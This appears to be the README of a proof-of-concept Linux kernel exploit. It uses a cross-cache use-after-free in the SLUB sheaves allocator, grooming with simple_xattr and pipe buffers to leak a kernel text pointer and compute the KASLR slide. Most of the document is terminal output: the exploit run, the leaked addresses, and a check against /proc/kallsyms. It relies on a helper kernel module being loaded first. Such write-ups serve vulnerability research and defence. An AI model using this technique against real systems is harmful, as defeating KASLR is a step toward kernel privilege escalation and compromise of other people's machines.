# Cross Cache UAF Exploitation pOc for Linux 7.0 Slub Sheaves (modprobe method)

>Cross cache UAF read information leak pOc using simple_xattr. No LPE, just info leak.

<pre>
Compile the LKM and then insmod before run the exploit.

┌──(robohax㉿robohax-20bws2ng00)-[/run/…/Desktop/KERNEL/STANDARD/linux-7.0]
└─$ nm vmlinux | grep anon_pipe_buf_ops
ffffffff82852ec0 d anon_pipe_buf_ops
                                       
So ? 
robohax@robohax-standardpc:~/Desktop/sheaf_uaf/cross_cache_read_leak_xattr/exploit$ ./exploit 0xffffffff82852ec0     
[*] obj_size=512 max_slots=16384 (kmalloc-rnd-512 victim)
[!] groom 960 victim (kmalloc-rnd-512)
[+] free 960 victim -> buddy (slots dangling)
[+] reclaim 1200 pipe ring (cg-512), buf->ops=.text
[+] slot 0 buf[0].ops = 0xffffffff9b852ec0
[+] slot 0 buf[1].ops = 0xffffffff9b852ec0
[+] slot 0 buf[2].ops = 0xffffffff9b852ec0
[+] slot 0 buf[3].ops = 0xffffffff9b852ec0
[+] slot 0 buf[4].ops = 0xffffffff9b852ec0
[+] slot 0 buf[5].ops = 0xffffffff9b852ec0
[+] slot 0 buf[6].ops = 0xffffffff9b852ec0
[+] slot 0 buf[7].ops = 0xffffffff9b852ec0
[+] got slot=0 buf[0] .text=0xffffffff9b852ec0
[+] KASLR slide=0x0000000019000000  base=0xffffffff9a000000

Verify ?
root@robohax-standardpc:/home/robohax/Desktop/sheaf_uaf/cross_cache_read_leak_xattr# cat /proc/kallsyms | grep _text
ffffffff9a000000 T _text

</pre>

